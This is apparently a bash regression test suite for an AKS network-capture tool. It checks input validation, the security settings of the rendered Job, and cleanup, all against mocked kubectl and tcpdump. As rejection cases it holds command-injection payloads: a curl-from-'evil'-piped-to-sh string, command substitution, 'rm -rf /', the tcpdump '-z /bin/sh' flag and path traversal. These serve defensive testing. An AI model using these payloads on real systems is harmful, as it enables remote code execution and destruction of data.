#!/usr/bin/env bash
# Security and runtime regression tests for aks-network-capture.
#
# Proves the command-injection class is neutralized: malicious --tcpdump-filter and
# out-of-range inputs are rejected during validation, BEFORE any kubectl call — so
# this runs in CI with no cluster. Mocked runtime checks also prove the Job uses one
# output filesystem and propagates tcpdump/archive failures without a success bundle.
set -u

SCRIPTS="$(cd "$(dirname "$0")/../../../skills/aks-network-capture/scripts" && pwd)"
CREATE_SCRIPT="$SCRIPTS/create-capture.sh"
RUN_SCRIPT="$SCRIPTS/run-capture.sh"
RETRIEVE_SCRIPT="$SCRIPTS/retrieve-captures.sh"
TEST_ROOT="$(mktemp -d)"
REAL_TAR="$(command -v tar)"
fails=0
pass() { echo "  ok: $1"; }
fail() { echo "  FAIL: $1" >&2; fails=$((fails+1)); }
cleanup() { rm -rf "$TEST_ROOT"; }
trap cleanup EXIT

# Case must be REJECTED (non-zero exit) without reaching kubectl.
reject() {
  local desc="$1"; shift
  if out="$("$CREATE_SCRIPT" "$@" 2>&1)"; then
    fail "$desc - script accepted a malicious/invalid input"
  else
    case "$out" in
      *"disallowed characters"*|*"flag tokens"*|*"must be"*|*"too long"*|*"too large"*|*"required"*)
        pass "$desc" ;;
      *) fail "$desc - rejected, but not by input validation (got: ${out%%$'\n'*})" ;;
    esac
  fi
}

assert_contains() {
  local desc="$1" pattern="$2" file="$3"
  if grep -Fq -- "$pattern" "$file"; then pass "$desc"; else fail "$desc"; fi
}

assert_not_contains() {
  local desc="$1" pattern="$2" file="$3"
  if grep -Fq -- "$pattern" "$file"; then fail "$desc"; else pass "$desc"; fi
}

echo "== aks-network-capture injection tests =="

reject "shell metacharacters in filter" \
  --name t --tcpdump-filter "udp port 53'; curl http://evil/x.sh | sh; echo '"
reject "command substitution in filter" \
  --name t --tcpdump-filter 'tcp port 80 $(id)'
reject "backtick in filter" \
  --name t --tcpdump-filter 'tcp port 80 `reboot`'
reject "tcpdump -z postrotate-command RCE flag" \
  --name t --tcpdump-filter "-z /bin/sh"
reject "semicolon chaining" \
  --name t --tcpdump-filter "port 53; rm -rf /"
reject "over-long duration" \
  --name t --duration 9999h
reject "non-numeric packet size" \
  --name t --packet-size "1;rm"
reject "invalid capture name" \
  --name "../../etc"
reject "overlong capture name" \
  --name aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# Static assertion: no `eval` in command position in the runtime scripts.
if grep -h -vE '^[[:space:]]*#' "$CREATE_SCRIPT" "$RUN_SCRIPT" "$RETRIEVE_SCRIPT" \
  | grep -Eq '(^|[;&|]|then|do|else|;)[[:space:]]*eval[[:space:]]'; then
  fail "capture runtime uses eval"
else
  pass "no eval command in capture runtime"
fi

echo
echo "== rendered Job security tests =="

MOCK_BIN="$TEST_ROOT/bin"
MANIFEST="$TEST_ROOT/job.yaml"
mkdir -p "$MOCK_BIN"
cat > "$MOCK_BIN/kubectl" <<'EOF'
#!/bin/sh
case "${KUBECTL_MODE:-manifest}:$1:$2" in
  manifest:get:configmap)
    cat "$MOCK_RUNNER_SCRIPT"
    exit 0
    ;;
  manifest:create:-f)
    cat > "$MANIFEST_OUT"
    printf '%s' "mock-capture-job"
    ;;
  selector-empty:get:configmap)
    cat "$MOCK_RUNNER_SCRIPT"
    ;;
  selector-empty:get:pods)
    exit 0
    ;;
  selector-empty:create:-f)
    printf '%s\n' "$*" >> "$JOB_CALL_LOG"
    cat >/dev/null
    ;;
  selector-no-ip:get:configmap)
    cat "$MOCK_RUNNER_SCRIPT"
    ;;
  selector-no-ip:get:pods)
    printf 'pending-pod|node-one|\n'
    ;;
  selector-no-ip:create:-f)
    printf '%s\n' "$*" >> "$JOB_CALL_LOG"
    cat >/dev/null
    ;;
  selector-mixed:get:configmap)
    cat "$MOCK_RUNNER_SCRIPT"
    ;;
  selector-mixed:get:pods)
    printf 'ready-pod|node-one|10.0.0.10,\npending-pod|node-two|\n'
    ;;
  selector-mixed:create:-f)
    printf '%s\n' "$*" >> "$JOB_CALL_LOG"
    cat >/dev/null
    ;;
  create-fail:get:configmap)
    cat "$MOCK_RUNNER_SCRIPT"
    ;;
  create-fail:create:-f)
    cat > "$MANIFEST_OUT"
    exit 17
    ;;
  create-fail:delete:jobs)
    printf '%s\n' "$*" >> "$DELETE_LOG"
    ;;
  stale-configmap:get:configmap)
    printf '%s\n' '#!/bin/sh' ': "${STAMP:?STAMP is required}"'
    ;;
  stale-configmap:create:-f)
    printf '%s\n' "$*" >> "$JOB_CALL_LOG"
    cat >/dev/null
    ;;
  retrieval:get:jobs)
    printf '%s' "cleanup-test-node-one"
    ;;
  retrieval:get:job)
    case "$*" in
      *RUN_ID*) printf '%s' "20260807-120000-111111111111111111111111" ;;
      *) printf '%s' "node-one" ;;
    esac
    ;;
  retrieval:get:pods)
    printf '%s' "cleanup-test-node-one-pod"
    ;;
  retrieval:get:pod)
    printf '%s' "Succeeded"
    ;;
  retrieval:create:-f)
    cat > "$RETRIEVAL_MANIFEST"
    printf '%s' "retrieve-cleanup-test-node-one-abc12"
    ;;
  retrieval:wait:*)
    exit 23
    ;;
  retrieval:delete:*)
    printf '%s\n' "$*" >> "$DELETE_LOG"
    ;;
  retrieval-scope:get:jobs)
    printf '%s' "scope-test-node-one"
    ;;
  retrieval-scope:get:job)
    case "$*" in
      *RUN_ID*) printf '%s' "20260807-120000-222222222222222222222222" ;;
      *) printf '%s' "node-one" ;;
    esac
    ;;
  retrieval-scope:get:pods)
    printf '%s' "scope-test-node-one-pod"
    ;;
  retrieval-scope:get:pod)
    printf '%s' "Succeeded"
    ;;
  retrieval-scope:create:-f)
    cat > "$RETRIEVAL_MANIFEST"
    printf '%s' "retrieve-scope-test-node-one-def34"
    ;;
  retrieval-scope:wait:*)
    exit 0
    ;;
  retrieval-scope:cp:*)
    printf '%s\n' "$*" >> "$SCOPE_LOG"
    destination="$5"
    mkdir -p "$(dirname "$destination")"
    printf 'bundle-data' > "$destination"
    ;;
  retrieval-scope:exec:*)
    printf '%s\n' "$*" >> "$SCOPE_LOG"
    selected_dir="${NODE_CAPTURE_ROOT}/${SELECTED_RUN_ID}"
    rm -f "${selected_dir}/${SELECTED_BUNDLE}" "${selected_dir}/${SELECTED_PCAP}"
    rmdir "$selected_dir"
    ;;
  retrieval-scope:delete:*)
    printf '%s\n' "$*" >> "$SCOPE_LOG"
    ;;
  retrieval-ambiguous:get:jobs)
    printf '20260807-120000-aaaaaaaaaaaaaaaaaaaaaaaa\n20260807-120001-bbbbbbbbbbbbbbbbbbbbbbbb\n'
    ;;
  *)
    echo "unexpected kubectl call: $*" >&2
    exit 97
    ;;
esac
EOF
chmod +x "$MOCK_BIN/kubectl"
export MOCK_RUNNER_SCRIPT="$RUN_SCRIPT"
cat > "$MOCK_BIN/od" <<'EOF'
#!/bin/sh
printf '%s\n' "${RUN_TOKEN_OVERRIDE:-0123456789abcdef01234567}"
EOF
chmod +x "$MOCK_BIN/od"

if KUBECTL_MODE=manifest MANIFEST_OUT="$MANIFEST" PATH="$MOCK_BIN:$PATH" \
  "$CREATE_SCRIPT" --name render-test --node-names node.one --duration 5s \
  --tcpdump-filter "udp port 53" >/dev/null 2>&1; then
  pass "render capture Job without a cluster"
else
  fail "render capture Job without a cluster"
fi

assert_contains "digest-pinned MCR image" \
  "mcr.microsoft.com/containernetworking/retina-shell:v1.2.3@sha256:c7dfe8e0c0dc7fa28e4cfbad04ade270c3051c42a5495488d4d897b49fb3366f" "$MANIFEST"
assert_contains "capabilities are NET_ADMIN and NET_RAW only" \
  'add: ["NET_ADMIN", "NET_RAW"]' "$MANIFEST"
assert_contains "dedicated output hostPath uses DirectoryOrCreate" \
  'hostPath: { path: "/var/log/aks-network-captures/render-test/' "$MANIFEST"
assert_contains "output hostPath uses a fixed in-container mount point" \
  'mountPath: "/capture-output"' "$MANIFEST"
assert_contains "runner writes to the fixed in-container mount point" \
  'name: OUT_DIR, value: "/capture-output"' "$MANIFEST"
assert_contains "fixed capture runner is invoked without shell -c" \
  'command: ["/bin/sh", "/capture-scripts/run-capture.sh"]' "$MANIFEST"
assert_contains "setup deploys the fixed capture runner" \
  '--from-file=run-capture.sh=' "$SCRIPTS/setup-capture-configmap.sh"
assert_contains "BPF expression is passed through one env value" \
  'name: PCAP_FILTER, value: "udp port 53"' "$MANIFEST"
assert_contains "capture identity is passed to the runner" \
  'name: CAPTURE_ID, value: "render-test"' "$MANIFEST"
assert_contains "run identity is passed to the runner" \
  'name: RUN_ID, value: "' "$MANIFEST"
assert_contains "valid DNS-subdomain node names are preserved" \
  'nodeName: "node.one"' "$MANIFEST"
assert_not_contains "no SYS_ADMIN capability" "SYS_ADMIN" "$MANIFEST"
assert_not_contains "no SYS_CHROOT capability" "SYS_CHROOT" "$MANIFEST"
assert_not_contains "no hostPID" "hostPID:" "$MANIFEST"
assert_not_contains "no privileged container" "privileged: true" "$MANIFEST"
assert_not_contains "no node-root mount" "mountPath: /host" "$MANIFEST"
assert_not_contains "no chroot command" "chroot" "$MANIFEST"
assert_not_contains "no interactive flags" "-it" "$MANIFEST"
assert_not_contains "capture runner does not require setuid capabilities" "-Z root" "$RUN_SCRIPT"

filter_count="$(grep -Fc 'udp port 53' "$MANIFEST")"
if [ "$filter_count" -eq 1 ]; then
  pass "BPF expression is absent from command text"
else
  fail "BPF expression is absent from command text"
fi

FIRST_MANIFEST="$TEST_ROOT/job-first.yaml"
SECOND_MANIFEST="$TEST_ROOT/job-second.yaml"
KUBECTL_MODE=manifest MANIFEST_OUT="$FIRST_MANIFEST" PATH="$MOCK_BIN:$PATH" \
  RUN_TOKEN_OVERRIDE=111111111111111111111111 \
  "$CREATE_SCRIPT" --name collision-test --node-names node-one --duration 5s >/dev/null 2>&1
KUBECTL_MODE=manifest MANIFEST_OUT="$SECOND_MANIFEST" PATH="$MOCK_BIN:$PATH" \
  RUN_TOKEN_OVERRIDE=222222222222222222222222 \
  "$CREATE_SCRIPT" --name collision-test --node-names node-one --duration 5s >/dev/null 2>&1
first_job="$(awk '/^  generateName: /{print $2; exit}' "$FIRST_MANIFEST")"
second_job="$(awk '/^  generateName: /{print $2; exit}' "$SECOND_MANIFEST")"
if [ -n "$first_job" ] && [ -n "$second_job" ] && [ "$first_job" != "$second_job" ]; then
  pass "same-second reruns receive collision-safe Job names"
else
  fail "same-second reruns receive collision-safe Job names"
fi

echo
echo "== target selection and ownership tests =="

STALE_JOB_CALL_LOG="$TEST_ROOT/stale-configmap-jobs.log"
if stale_out="$(KUBECTL_MODE=stale-configmap JOB_CALL_LOG="$STALE_JOB_CALL_LOG" \
  PATH="$MOCK_BIN:$PATH" "$CREATE_SCRIPT" --name stale-runner \
  --node-names node-one 2>&1)"; then
  fail "stale capture runner ConfigMap is rejected"
else
  case "$stale_out" in
    *"ConfigMap 'network-capture-scripts' is stale"*) pass "stale capture runner ConfigMap is rejected" ;;
    *) fail "stale capture runner fails with setup guidance" ;;
  esac
fi
if [ -s "$STALE_JOB_CALL_LOG" ]; then
  fail "stale capture runner renders no Job"
else
  pass "stale capture runner renders no Job"
fi

JOB_CALL_LOG="$TEST_ROOT/selector-jobs.log"
if KUBECTL_MODE=selector-empty JOB_CALL_LOG="$JOB_CALL_LOG" PATH="$MOCK_BIN:$PATH" \
  "$CREATE_SCRIPT" --name empty-selector --pod-selector "app=missing" >/dev/null 2>&1; then
  fail "empty pod selector is rejected"
else
  pass "empty pod selector is rejected"
fi
if [ -s "$JOB_CALL_LOG" ]; then
  fail "empty pod selector renders no Job"
else
  pass "empty pod selector renders no Job"
fi

EXPLICIT_EMPTY_JOB_LOG="$TEST_ROOT/explicit-empty-selector-jobs.log"
if KUBECTL_MODE=selector-empty JOB_CALL_LOG="$EXPLICIT_EMPTY_JOB_LOG" PATH="$MOCK_BIN:$PATH" \
  "$CREATE_SCRIPT" --name explicit-empty --pod-selector "" >/dev/null 2>&1; then
  fail "explicitly empty pod selector is rejected"
else
  pass "explicitly empty pod selector is rejected"
fi
if [ -s "$EXPLICIT_EMPTY_JOB_LOG" ]; then
  fail "explicitly empty pod selector renders no Job"
else
  pass "explicitly empty pod selector renders no Job"
fi

NO_IP_JOB_CALL_LOG="$TEST_ROOT/no-ip-selector-jobs.log"
if KUBECTL_MODE=selector-no-ip JOB_CALL_LOG="$NO_IP_JOB_CALL_LOG" PATH="$MOCK_BIN:$PATH" \
  "$CREATE_SCRIPT" --name no-ip-selector --pod-selector "app=pending" >/dev/null 2>&1; then
  fail "pod selector without assigned IPs is rejected"
else
  pass "pod selector without assigned IPs is rejected"
fi
if [ -s "$NO_IP_JOB_CALL_LOG" ]; then
  fail "pod selector without assigned IPs renders no Job"
else
  pass "pod selector without assigned IPs renders no Job"
fi

MIXED_JOB_CALL_LOG="$TEST_ROOT/mixed-selector-jobs.log"
if KUBECTL_MODE=selector-mixed JOB_CALL_LOG="$MIXED_JOB_CALL_LOG" PATH="$MOCK_BIN:$PATH" \
  "$CREATE_SCRIPT" --name mixed-selector --pod-selector "app=mixed" >/dev/null 2>&1; then
  fail "mixed ready and pending pod selection is rejected"
else
  pass "mixed ready and pending pod selection is rejected"
fi
if [ -s "$MIXED_JOB_CALL_LOG" ]; then
  fail "mixed ready and pending pod selection renders no Job"
else
  pass "mixed ready and pending pod selection renders no Job"
fi

FAILED_CREATE_MANIFEST="$TEST_ROOT/create-fail.yaml"
FAILED_CREATE_DELETE_LOG="$TEST_ROOT/create-fail-delete.log"
if KUBECTL_MODE=create-fail MANIFEST_OUT="$FAILED_CREATE_MANIFEST" \
  DELETE_LOG="$FAILED_CREATE_DELETE_LOG" PATH="$MOCK_BIN:$PATH" \
  "$CREATE_SCRIPT" --name prior-run --node-names node-one --duration 5s >/dev/null 2>&1; then
  fail "pre-existing Job creation collision remains attributable"
else
  pass "pre-existing Job creation collision remains attributable"
fi
if [ -s "$FAILED_CREATE_DELETE_LOG" ]; then
  fail "failed Job creation does not delete an earlier run"
else
  pass "failed Job creation does not delete an earlier run"
fi

echo
echo "== capture runtime regression tests =="

cat > "$MOCK_BIN/tcpdump" <<'EOF'
#!/bin/sh
if [ "${1:-}" = "-d" ]; then
  exit 0
fi
if [ "${TCPDUMP_FAIL:-0}" -eq 1 ]; then
  exit 42
fi
output=""
while [ "$#" -gt 0 ]; do
  if [ "$1" = "-w" ]; then
    shift
    output="$1"
  fi
  shift
done
[ -n "$output" ] || exit 98
if [ "${TCPDUMP_EMPTY:-0}" -eq 1 ]; then
  : > "$output"
else
  printf 'pcap-data' > "$output"
fi
EOF
cat > "$MOCK_BIN/timeout" <<'EOF'
#!/bin/sh
shift
"$@"
status=$?
[ "$status" -eq 0 ] || exit "$status"
if [ "${TIMEOUT_EXPIRED:-0}" -eq 1 ]; then
  exit 124
fi
EOF
cat > "$MOCK_BIN/tar" <<'EOF'
#!/bin/sh
if [ "${TAR_FAIL:-0}" -eq 1 ]; then
  exit 43
fi
exec "$REAL_TAR" "$@"
EOF
chmod +x "$MOCK_BIN/tcpdump" "$MOCK_BIN/timeout" "$MOCK_BIN/tar"

SUCCESS_DIR="$TEST_ROOT/artifacts/capture-alpha"
if success_out="$(PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TIMEOUT_EXPIRED=1 OUT_DIR="$SUCCESS_DIR" \
  CAPTURE_ID=capture-alpha NODE_NAME=node-one RUN_ID=20260807-120000-111111111111111111111111 \
  CAPTURE_DURATION=5 PACKET_SIZE=0 \
  PCAP_FILTER="udp port 53" "$RUN_SCRIPT" 2>&1)"; then
  pass "capture runner creates an archive in the mounted output directory"
else
  fail "capture runner creates an archive in the mounted output directory"
fi
SUCCESS_BUNDLE="$SUCCESS_DIR/capture-capture-alpha-node-one-20260807-120000-111111111111111111111111.tar.gz"
if [ -s "$SUCCESS_BUNDLE" ] \
  && "$REAL_TAR" -tzf "$SUCCESS_BUNDLE" | grep -q '^capture-capture-alpha-node-one-20260807-120000-111111111111111111111111\.pcap$'; then
  pass "archive contains the non-empty pcap"
else
  fail "archive contains the non-empty pcap"
fi
case "$success_out" in
  *"bundle: $SUCCESS_BUNDLE"*) pass "success is reported only after archive creation" ;;
  *) fail "success is reported only after archive creation" ;;
esac

SECOND_CAPTURE_DIR="$TEST_ROOT/artifacts/capture-beta"
if PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TIMEOUT_EXPIRED=1 OUT_DIR="$SECOND_CAPTURE_DIR" \
  CAPTURE_ID=capture-beta NODE_NAME=node-one RUN_ID=20260807-120000-111111111111111111111111 \
  CAPTURE_DURATION=5 PACKET_SIZE=0 PCAP_FILTER="" "$RUN_SCRIPT" >/dev/null 2>&1 \
  && [ -s "$SECOND_CAPTURE_DIR/capture-capture-beta-node-one-20260807-120000-111111111111111111111111.tar.gz" ] \
  && [ ! -e "$SUCCESS_DIR/capture-capture-beta-node-one-20260807-120000-111111111111111111111111.tar.gz" ]; then
  pass "concurrent captures with the same node and run time remain isolated"
else
  fail "concurrent captures with the same node and run time remain isolated"
fi

TCPDUMP_FAIL_DIR="$TEST_ROOT/tcpdump-fail"
if tcpdump_fail_out="$(PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TCPDUMP_FAIL=1 \
  OUT_DIR="$TCPDUMP_FAIL_DIR" CAPTURE_ID=capture-fail NODE_NAME=node-one \
  RUN_ID=20260807-120001-111111111111111111111111 \
  CAPTURE_DURATION=5 PACKET_SIZE=0 PCAP_FILTER="" "$RUN_SCRIPT" 2>&1)"; then
  fail "tcpdump failure fails the capture runner"
else
  pass "tcpdump failure fails the capture runner"
fi
case "$tcpdump_fail_out" in
  *"bundle:"*) fail "tcpdump failure does not print success" ;;
  *) pass "tcpdump failure does not print success" ;;
esac
if [ -e "$TCPDUMP_FAIL_DIR/capture-capture-fail-node-one-20260807-120001-111111111111111111111111.tar.gz" ]; then
  fail "tcpdump failure does not create a bundle"
else
  pass "tcpdump failure does not create a bundle"
fi

EMPTY_PCAP_DIR="$TEST_ROOT/empty-pcap"
if empty_pcap_out="$(PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TIMEOUT_EXPIRED=1 TCPDUMP_EMPTY=1 \
  OUT_DIR="$EMPTY_PCAP_DIR" CAPTURE_ID=capture-empty NODE_NAME=node-one \
  RUN_ID=20260807-120003-111111111111111111111111 \
  CAPTURE_DURATION=5 PACKET_SIZE=0 PCAP_FILTER="" "$RUN_SCRIPT" 2>&1)"; then
  fail "timeout without a non-empty pcap fails the capture runner"
else
  pass "timeout without a non-empty pcap fails the capture runner"
fi
case "$empty_pcap_out" in
  *"bundle:"*) fail "empty pcap does not print success" ;;
  *) pass "empty pcap does not print success" ;;
esac

TAR_FAIL_DIR="$TEST_ROOT/tar-fail"
if tar_fail_out="$(PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TAR_FAIL=1 \
  OUT_DIR="$TAR_FAIL_DIR" CAPTURE_ID=capture-tar-fail NODE_NAME=node-one \
  RUN_ID=20260807-120002-111111111111111111111111 \
  CAPTURE_DURATION=5 PACKET_SIZE=0 PCAP_FILTER="" "$RUN_SCRIPT" 2>&1)"; then
  fail "archive failure fails the capture runner"
else
  pass "archive failure fails the capture runner"
fi
case "$tar_fail_out" in
  *"bundle:"*) fail "archive failure does not print success" ;;
  *) pass "archive failure does not print success" ;;
esac
if [ -e "$TAR_FAIL_DIR/capture-capture-tar-fail-node-one-20260807-120002-111111111111111111111111.tar.gz" ]; then
  fail "archive failure does not leave a success bundle"
else
  pass "archive failure does not leave a success bundle"
fi

echo
echo "== retrieval cleanup regression test =="

DELETE_LOG="$TEST_ROOT/delete.log"
RETRIEVAL_MANIFEST="$TEST_ROOT/retrieval-fail.yaml"
if KUBECTL_MODE=retrieval DELETE_LOG="$DELETE_LOG" RETRIEVAL_MANIFEST="$RETRIEVAL_MANIFEST" \
  PATH="$MOCK_BIN:$PATH" \
  "$RETRIEVE_SCRIPT" --name cleanup-test \
  --run-id 20260807-120000-111111111111111111111111 \
  --workspace-dir "$TEST_ROOT/workspace" \
  >/dev/null 2>&1; then
  fail "retrieval wait failure remains attributable"
else
  pass "retrieval wait failure remains attributable"
fi
assert_contains "owned retrieval pod is deleted after failure" \
  "delete pod retrieve-cleanup-test-node-one-abc12 -n default --ignore-not-found" "$DELETE_LOG"
assert_contains "capture Jobs are deleted after retrieval failure" \
  "delete jobs -n default cleanup-test-node-one --ignore-not-found" "$DELETE_LOG"
assert_not_contains "retrieval cleanup does not use a capture-wide Job selector" \
  "delete jobs -n default -l capture-id=cleanup-test" "$DELETE_LOG"
assert_contains "retrieval mounts only the requested capture directory" \
  "path: /var/log/aks-network-captures/cleanup-test" "$RETRIEVAL_MANIFEST"

SCOPE_LOG="$TEST_ROOT/retrieval-scope.log"
SCOPE_MANIFEST="$TEST_ROOT/retrieval-scope.yaml"
SCOPE_WORKSPACE="$TEST_ROOT/scope-workspace"
SELECTED_RUN_ID="20260807-120000-222222222222222222222222"
SIBLING_RUN_ID="20260807-120001-333333333333333333333333"
SELECTED_BUNDLE="capture-scope-test-node-one-${SELECTED_RUN_ID}.tar.gz"
SELECTED_PCAP="capture-scope-test-node-one-${SELECTED_RUN_ID}.pcap"
NODE_CAPTURE_ROOT="$TEST_ROOT/node-captures/scope-test"
mkdir -p "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID" "$NODE_CAPTURE_ROOT/$SIBLING_RUN_ID"
printf 'selected-bundle' > "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID/$SELECTED_BUNDLE"
printf 'selected-pcap' > "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID/$SELECTED_PCAP"
printf 'sibling-bundle' > "$NODE_CAPTURE_ROOT/$SIBLING_RUN_ID/sibling.tar.gz"
export NODE_CAPTURE_ROOT SELECTED_RUN_ID SELECTED_BUNDLE SELECTED_PCAP
if KUBECTL_MODE=retrieval-scope SCOPE_LOG="$SCOPE_LOG" RETRIEVAL_MANIFEST="$SCOPE_MANIFEST" \
  PATH="$MOCK_BIN:$PATH" "$RETRIEVE_SCRIPT" --name scope-test \
  --run-id "$SELECTED_RUN_ID" \
  --workspace-dir "$SCOPE_WORKSPACE" >/dev/null 2>&1; then
  pass "scoped retrieval succeeds with the exact current bundle"
else
  fail "scoped retrieval succeeds with the exact current bundle"
fi
assert_contains "retrieval copies only the requested run bundle" \
  "cp -n default retrieve-scope-test-node-one-def34:/capture-root/${SELECTED_RUN_ID}/${SELECTED_BUNDLE}" "$SCOPE_LOG"
assert_not_contains "retrieval does not copy the shared capture directory" \
  ":/capture-root/." "$SCOPE_LOG"
assert_contains "retrieval deletes only the requested run artifacts" \
  "/capture-root/${SELECTED_RUN_ID} ${SELECTED_BUNDLE} ${SELECTED_PCAP}" "$SCOPE_LOG"
assert_not_contains "retrieval does not touch a stale capture id" "stale-capture" "$SCOPE_LOG"
assert_not_contains "retrieval cleanup uses no artifact wildcard" "*" "$SCOPE_LOG"
assert_contains "scoped retrieval mounts only its capture id" \
  "path: /var/log/aks-network-captures/scope-test" "$SCOPE_MANIFEST"
if [ ! -e "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID" ]; then
  pass "retrieval removes the exact selected run directory"
else
  fail "retrieval removes the exact selected run directory"
fi
if [ -s "$NODE_CAPTURE_ROOT/$SIBLING_RUN_ID/sibling.tar.gz" ]; then
  pass "retrieval preserves sibling run directories and files"
else
  fail "retrieval preserves sibling run directories and files"
fi

mkdir -p "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID"
printf 'selected-bundle' > "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID/$SELECTED_BUNDLE"
printf 'selected-pcap' > "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID/$SELECTED_PCAP"
printf 'unexpected' > "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID/unexpected.txt"
if KUBECTL_MODE=retrieval-scope SCOPE_LOG="$SCOPE_LOG" RETRIEVAL_MANIFEST="$SCOPE_MANIFEST" \
  PATH="$MOCK_BIN:$PATH" "$RETRIEVE_SCRIPT" --name scope-test \
  --run-id "$SELECTED_RUN_ID" \
  --workspace-dir "$TEST_ROOT/unexpected-workspace" >/dev/null 2>&1; then
  fail "unexpected run artifacts fail cleanup closed"
else
  pass "unexpected run artifacts fail cleanup closed"
fi
if [ -s "$NODE_CAPTURE_ROOT/$SELECTED_RUN_ID/unexpected.txt" ]; then
  pass "fail-closed cleanup preserves unexpected run artifacts"
else
  fail "fail-closed cleanup preserves unexpected run artifacts"
fi

if invalid_run_out="$(KUBECTL_MODE=retrieval-ambiguous PATH="$MOCK_BIN:$PATH" \
  "$RETRIEVE_SCRIPT" --name reused-name --run-id malformed 2>&1)"; then
  fail "malformed retrieval run identity is rejected"
else
  case "$invalid_run_out" in
    *"--run-id has an invalid format"*) pass "malformed retrieval run identity is rejected" ;;
    *) fail "malformed retrieval run identity fails during input validation" ;;
  esac
fi

if ambiguous_out="$(KUBECTL_MODE=retrieval-ambiguous PATH="$MOCK_BIN:$PATH" \
  "$RETRIEVE_SCRIPT" --name reused-name --workspace-dir "$TEST_ROOT/ambiguous" 2>&1)"; then
  fail "ambiguous same-name runs require explicit selection"
else
  case "$ambiguous_out" in
    *"multiple capture runs found"*) pass "ambiguous same-name runs require explicit selection" ;;
    *) fail "ambiguous same-name runs fail with an attributable error" ;;
  esac
fi

echo
if [ "$fails" -eq 0 ]; then echo "All capture security and regression tests passed."; exit 0
else echo "$fails capture test(s) FAILED."; exit 1; fi
